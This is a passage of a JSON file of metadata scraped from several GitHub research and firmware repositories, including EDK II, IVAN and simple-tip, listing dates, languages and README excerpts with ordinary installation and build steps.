                },
                "confidence": 0.9999999912213298,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/panthap2/deep-jit-inconsistency-detection/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-06T01:16:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-08T15:06:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 261127
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 246
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "131": {
        "filename": "sea-lab_hybrid-net_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sea-lab/hybrid-net",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-12-16T05:01:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-23T02:35:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 135924
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54017
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "132": {
        "filename": "tianocore_edk2_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tianocore/edk2",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\n============================= ================= =============== ===================\r\n Host Type & Toolchain        Build Status      Test Status     Code Coverage\r\n============================= ================= =============== ===================\r\nWindows_VS2019_               |WindowsCiBuild|  |WindowsCiTest| |WindowsCiCoverage|\r\nUbuntu_GCC5_                  |UbuntuCiBuild|   |UbuntuCiTest|  |UbuntuCiCoverage|\r\n============================= ================= =============== ===================\r\n\r\n`More CI Build information <.pytool/Readme.md>`__\r\n\r \n",
                    "original_header": "Core CI Build Status"
                },
                "confidence": 0.9999888172624618,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tianocore/edk2/master/ReadMe.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nThe current submodules used in EDK II are in `.gitmodules <.gitmodules>`__.\r\n\r\nTo get a full, buildable EDK II repository, use following steps of git\r\ncommand\r\n\r\n.. code-block:: bash\r\n\r\n  git clone https://github.com/tianocore/edk2.git\r\n  cd edk2\r\n  git submodule update --init\r\n  cd ..\r\n\r\nIf there's update for submodules, use following git commands to get\r\nthe latest submodules code.\r\n\r\n.. code-block:: bash\r\n\r\n  cd edk2\r\n  git pull\r\n  git submodule update\r\n\r\nNote: When cloning submodule repos, '--recursive' option is not\r\nrecommended. EDK II itself will not use any code/feature from\r\nsubmodules in above submodules. So using '--recursive' adds a\r\ndependency on being able to reach servers we do not actually want\r\nany code from, as well as needlessly downloading code we will not\r\nuse.\r\n\r\n**Submodule Notes**\r\n\r\nArmSoftFloatLib is required by OpensslLib. It's inevitable in openssl-1.1.1\r\n(since stable201905) for floating point parameter conversion, but should be\r\ndropped once there's no such need in future release of openssl.\r\n\r\n.. ===================================================================\r\n.. This is a bunch of directives to make the README file more readable\r\n.. ===================================================================\r\n\r\n.. CoreCI\r\n\r\n.. _Windows_VS2019: https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=32&branchName=master\r\n.. |WindowsCiBuild| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/Windows%20VS2019%20CI?branchName=master\r\n.. |WindowsCiTest| image:: https://img.shields.io/azure-devops/tests/tianocore/edk2-ci/32.svg\r\n.. |WindowsCiCoverage| image:: https://img.shields.io/badge/coverage-coming_soon-blue\r\n\r\n.. _Ubuntu_GCC5: https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=31&branchName=master\r\n.. |UbuntuCiBuild| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/Ubuntu%20GCC5%20CI?branchName=master\r\n.. |UbuntuCiTest| image:: https://img.shields.io/azure-devops/tests/tianocore/edk2-ci/31.svg\r\n.. |UbuntuCiCoverage| image:: https://img.shields.io/badge/coverage-coming_soon-blue\r\n\r\n.. ArmVirtPkg\r\n\r\n.. _ArmVirtPkg_Ubuntu_GCC5: https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=46&branchName=master\r\n.. |avAArch64du| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_ArmVirtPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20QEMU_AARCH64_DEBUG\r\n.. |avAArch64ru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_ArmVirtPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20QEMU_AARCH64_RELEASE\r\n.. |avAArch64nu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_ArmVirtPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20QEMU_AARCH64_NOOPT\r\n\r\n.. |avArmdu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_ArmVirtPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20QEMU_ARM_DEBUG\r\n.. |avArmru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_ArmVirtPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20QEMU_ARM_RELEASE\r\n.. |avArmnu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_ArmVirtPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20QEMU_ARM_NOOPT\r\n\r\n.. EmulatorPkg\r\n\r\n.. |TCBZ_2668| image:: https://img.shields.io/bugzilla/2668?baseUrl=https%3A%2F%2Fbugzilla.tianocore.org\r\n.. _TCBZ_2668: https://bugzilla.tianocore.org/show_bug.cgi?id=2668\r\n\r\n.. |TCBZ_2639| image:: https://img.shields.io/bugzilla/2639?baseUrl=https%3A%2F%2Fbugzilla.tianocore.org\r\n.. _TCBZ_2639: https://bugzilla.tianocore.org/show_bug.cgi?id=2639\r\n\r\n.. _EmulatorPkg_Win_VS2019:  https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=44&branchName=master\r\n.. _EmulatorPkg_Ubuntu_GCC5: https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=43&branchName=master\r\n\r\n.. |em32d| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_DEBUG\r\n.. |em32du| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_DEBUG\r\n.. |em32r| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_RELEASE\r\n.. |em32ru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_RELEASE\r\n.. |em32n| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_NOOPT\r\n.. |em32nu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_NOOPT\r\n\r\n.. |em32fd| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_FULL_DEBUG\r\n.. |em32fdu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_FULL_DEBUG\r\n.. |em32fr| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_FULL_RELEASE\r\n.. |em32fru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_FULL_RELEASE\r\n.. |em32fn| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_FULL_NOOPT\r\n.. |em32fnu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_IA32_FULL_NOOPT\r\n\r\n.. |em64d| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_DEBUG\r\n.. |em64du| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_DEBUG\r\n.. |em64r| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_RELEASE\r\n.. |em64ru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_RELEASE\r\n.. |em64n| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_NOOPT\r\n.. |em64nu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_NOOPT\r\n\r\n.. |em64fd| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_FULL_DEBUG\r\n.. |em64fdu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_FULL_DEBUG\r\n.. |em64fr| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_FULL_RELEASE\r\n.. |em64fru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_FULL_RELEASE\r\n.. |em64fn| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_FULL_NOOPT\r\n.. |em64fnu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_EmulatorPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20EmulatorPkg_X64_FULL_NOOPT\r\n\r\n.. OvmfPkg\r\n\r\n.. |TCBZ_2661| image:: https://img.shields.io/bugzilla/2661?baseUrl=https%3A%2F%2Fbugzilla.tianocore.org\r\n.. _TCBZ_2661: https://bugzilla.tianocore.org/show_bug.cgi?id=2661\r\n\r\n.. _OvmfPkg_Win_VS2019:  https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=50&branchName=master\r\n.. _OvmfPkg_Ubuntu_GCC5: https://dev.azure.com/tianocore/edk2-ci/_build/latest?definitionId=48&branchName=master\r\n\r\n.. |op32d| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32_DEBUG\r\n.. |op32du| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32_DEBUG\r\n.. |op32r| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32_RELEASE\r\n.. |op32ru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32_RELEASE\r\n.. |op32n| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32_NOOPT\r\n.. |op32nu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32_NOOPT\r\n\r\n.. |op64d| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_X64_DEBUG\r\n.. |op64du| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_X64_DEBUG\r\n.. |op64r| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_X64_RELEASE\r\n.. |op64ru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_X64_RELEASE\r\n.. |op64n| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_X64_NOOPT\r\n.. |op64nu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_X64_NOOPT\r\n\r\n\r\n.. |op3264d| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_DEBUG\r\n.. |op3264du| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_DEBUG\r\n.. |op3264r| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_RELEASE\r\n.. |op3264ru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_RELEASE\r\n.. |op3264n| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_NOOPT\r\n.. |op3264nu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_NOOPT\r\n\r\n.. |op3264fd| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_FULL_DEBUG\r\n.. |op3264fdu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_FULL_DEBUG\r\n.. |op3264fr| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Windows_VS2019_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_FULL_RELEASE\r\n.. |op3264fru| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_FULL_RELEASE\r\n.. |op3264fn| replace:: |TCBZ_2661|_\r\n.. |op3264fnu| image:: https://dev.azure.com/tianocore/edk2-ci/_apis/build/status/PlatformCI_OvmfPkg_Ubuntu_GCC5_CI?branchName=master&jobName=Platform_CI&configuration=Platform_CI%20OVMF_IA32X64_FULL_NOOPT\r\n \n",
                    "original_header": "Submodules"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tianocore/edk2/master/ReadMe.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "==============\r\nEDK II Project\r\n==============\r\n\r\nA modern, feature-rich, cross-platform firmware development\r\nenvironment for the UEFI and PI specifications from www.uefi.org. \n"
                },
                "confidence": 0.9940965136447822,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tianocore/edk2/master/ReadMe.rst"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2011-04-14T07:35:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T20:32:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 71767653
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Assembly",
                    "name": "Assembly",
                    "type": "Programming_language",
                    "size": 11308357
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8609674
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 1357003
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1034618
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "DenizenScript",
                    "name": "DenizenScript",
                    "type": "Programming_language",
                    "size": 708973
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "GAP",
                    "name": "GAP",
                    "type": "Programming_language",
                    "size": 426624
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "BitBake",
                    "name": "BitBake",
                    "type": "Programming_language",
                    "size": 88923
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ASL",
                    "name": "ASL",
                    "type": "Programming_language",
                    "size": 80730
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 67861
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 48015
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 43888
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "NASL",
                    "name": "NASL",
                    "type": "Programming_language",
                    "size": 43120
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rez",
                    "name": "Rez",
                    "type": "Programming_language",
                    "size": 21053
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 15914
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 13862
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 6086
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "NSIS",
                    "name": "NSIS",
                    "type": "Programming_language",
                    "size": 1847
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 1410
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "GDB",
                    "name": "GDB",
                    "type": "Programming_language",
                    "size": 96
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "133": {
        "filename": "uiuc-focal-lab_IVAN_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/uiuc-focal-lab/IVAN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "GUROBI installation instructions can be found at `https://www.gurobi.com/documentation/9.5/quickstart_linux/software_installation_guid.html`\n\nFor Linux-based systems the installation steps are:\nInstall Gurobi:\n```\nwget https://packages.gurobi.com/9.1/gurobi9.1.2_linux64.tar.gz\ntar -xvf gurobi9.1.2_linux64.tar.gz\ncd gurobi912/linux64/src/build\nsed -ie 's/^C++FLAGS =.*$/& -fPIC/' Makefile\nmake\ncp libgurobi_c++.a ../../lib/\ncd ../../\ncp lib/libgurobi91.so /usr/local/lib -> (You may need to use sudo command for this)   \npython3 setup.py install\ncd ../../\n```\n\nUpdate environment variables:\ni) Run following export commands in command prompt/terminal (these environment values are only valid for the current session) \nii) Or copy the lines in the .bashrc file (or .zshrc if using zshell), and save the file \n\n```\nexport GUROBI_HOME=\"$HOME/opt/gurobi950/linux64\"\nexport GRB_LICENSE_FILE=\"$HOME/gurobi.lic\"\nexport PATH=\"${PATH}:${GUROBI_HOME}/bin\"\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/$HOME/usr/local/lib:/usr/local/lib\n```\n\nGetting the free academic license\nTo run GUROBI one also needs to get a free academic license. https://www.gurobi.com/documentation/9.5/quickstart_linux/retrieving_a_free_academic.html#subsection:academiclicense\n\na) Register using any academic email ID on the GUROBI website. b) Generate the license on https://portal.gurobi.com/iam/licenses/request/\n\nChoose Named-user Academic\n\n\nc)Use the command in the command prompt to generate the licesne. \n\n\n(If not automatically done, place the license in one of the following locations \u201c/opt/gurobi/gurobi.lic\u201d or \u201c$HOME/gurobi.lic\u201d)\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Installing Gurobi",
                    "parent_header": [
                        "IVAN",
                        "Reproducing Testing Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uiuc-focal-lab/IVAN/main/README.md"
            },
            {
                "result": {
                    "value": "First, make sure you have venv (https://docs.python.org/3/library/venv.html).\nIf venv is not already installed, install it with the following command (Use appropriate python version)\n\n`sudo apt-get install python3.8-venv`\n\n(One can also use other environments such as conda, however we have not tested the experiments on other Python environments) \n\nTo create the virtual environment,\n\n`python3 -m venv env`\n\nThen to enter the virtual environment, run\n\n`source env/bin/activate`\n\nInstall all packages including the compiler with\n\n`pip install -r requirements.txt` \n\nEven if installation of any of the libraries does not work, ignore and continue with the next steps\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 2: Installing Python dependencies in a virtual environment",
                    "parent_header": [
                        "IVAN",
                        "Reproducing Testing Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uiuc-focal-lab/IVAN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nSimilar to existing experiments one can easily add new experiments using a unit test. One can add this test in existing test file nnverify/test_pldi.py or can create a new test file.  \nMore information about the adding unittests in python is available here https://docs.python.org/3/library/unittest.html.  \n",
                    "original_header": "Adding New Experiments"
                },
                "confidence": 0.9704207068774942,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uiuc-focal-lab/IVAN/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-10T17:55:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-04T21:57:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 372091
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1760
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "134": {
        "filename": "testingautomated-usi_simple-tip_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/testingautomated-usi/simple-tip",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\u26a0\ufe0f This repository is indended for reproduction of our results; dependencies are not updated on purpose. The repository may thus contain vulnerabilities. We recommend you run it in a safe environment \u26a0\ufe0f\n \n",
                    "original_header": "Reproduction Package of ISSTA 2022 paper \"Simple Techniques Work Surprisingly Well...\""
                },
                "confidence": 0.9787794220850616,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/testingautomated-usi/simple-tip/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<sub>Please note that these steps contain tensorflow operations which are system dependent\nand intrinsically random (that's why we conducted 100 re-runs) and that, if you abort any \nof these steps before completion, your assets folder might be in a corrupted state.\nIf in doubt, just replace the `/path/to/assets/` folder with a new one downloaded from zenodo.</sub> \n",
                    "original_header": "Re-Generating assets"
                },
                "confidence": 0.9997268813091106,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/testingautomated-usi/simple-tip/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-04-28T06:44:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-12T07:24:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 210614
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 708
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "135": {
        "filename": "anonymous-authorxyz_fuzzing-rpc_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/anonymous-authorxyz/fuzzing-rpc",
                    "type": "Url"
                },
                "confidence": 1,
